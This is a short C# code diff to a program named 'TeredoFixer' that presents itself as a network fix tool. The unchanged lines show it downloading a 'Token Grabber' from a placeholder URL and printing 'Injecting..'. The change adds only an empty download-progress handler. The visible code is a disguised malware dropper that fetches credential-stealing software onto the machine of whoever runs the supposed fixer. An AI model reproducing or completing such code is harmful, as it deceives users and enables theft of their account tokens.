@@ -29,6 +29,7 @@ namespace TeredoFixer
                 // Downloading Token Grabber
                 WebClient webClient = new WebClient();
                 webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(Completed);
+                webClient.DownloadProgressChanged += new DownloadProgressChangedEventHandler(ProgressChanged);
                 webClient.DownloadFileAsync(new Uri("YOUR FILE HERE"), grapped);
                 Console.Clear();
                 Console.WriteLine("Injecting..");
@@ -36,7 +37,10 @@ namespace TeredoFixer
             catch {
                 Console.WriteLine("FAILED");
             }
-
+            void ProgressChanged(object sender, DownloadProgressChangedEventArgs e)
+            {
+                
+            }
  
             void Completed(object sender, AsyncCompletedEventArgs e)
             {
